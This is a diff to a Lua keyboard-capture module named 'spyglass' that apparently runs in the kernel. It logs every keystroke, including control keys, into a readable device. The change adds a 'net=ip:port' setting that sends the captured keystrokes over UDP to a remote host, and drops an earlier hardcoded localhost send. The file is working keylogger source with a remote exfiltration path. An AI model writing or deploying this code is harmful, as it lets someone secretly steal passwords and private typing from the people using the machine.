@@ -25,6 +25,10 @@ local notifier = require("notifier")
 local device = require("device")
 local inet = require("socket.inet")
 
+local function info(...)
+	print("spyglass: " .. string.format(...))
+end
+
 local control = {
 	 [0] = "nul",  [1] = "soh",  [2] = "stx",  [3] = "etx",  [4] = "eot",  [5] = "enq",
 	 [6] = "ack",  [7] = "bel",  [8] = "bs",   [9] = "ht",  [10] = "nl",  [11] = "vt",
@@ -45,16 +49,44 @@ local spyglass = {name = "spyglass", open = nop, release = nop, log = ""}
 function spyglass:read()
 	local log = self.log
 	self.log = ""
+	local socket = self.socket
+	if socket and #log > 0 then
+		pcall(socket.send, socket, log, ip, port)
+		return ""
+	end
 	return log
 end
 
+local settings = {
+	['enable'] = function (self, enable)
+		local enable = enable ~= "false"
+		if enable and not self.notifier then
+			self.notifier = notifier.keyboard(self.callback)
+		elseif not enable and self.notifier then
+			self.notifier:delete()
+			self.notifier = nil
+		end
+	end,
+	['net'] = function (self, net)
+		local ip, port = string.match(net, "(%g+):(%d+)")
+		if ip then
+			info("enabling network support %s:%d", ip, port)
+			self.socket = inet.udp()
+			self.socket:connect(ip, port)
+		elseif self.socket then
+			info("disabling network support")
+			self.socket:close()
+			self.socket = nil
+		end
+	end
+}
+
 function spyglass:write(buf)
-	local enable = tonumber(buf) ~= 0
-	if enable and not self.notifier then
-		self.notifier = notifier.keyboard(self.callback)
-	elseif not enable and self.notifier then
-		self.notifier:delete()
-		self.notifier = nil
+	for k, v in string.gmatch(buf, "(%w+)=(%g+)") do
+		local setter = settings[k]
+		if setter then
+			setter(self, v)
+		end
 	end
 end
 
@@ -66,12 +98,10 @@ function spyglass.callback(event, down, shift, key)
 		local log = printable(keysym) and string.char(keysym) or
 			string.format("<%s>", control[keysym])
 		spyglass.log = spyglass.log .. log
-		spyglass.client:send(log, inet.localhost, 1337)
 	end
 	return notify.OK
 end
 
 spyglass.notifier = notifier.keyboard(spyglass.callback)
 spyglass.device = device.new(spyglass)
-spyglass.client = inet.udp()
 
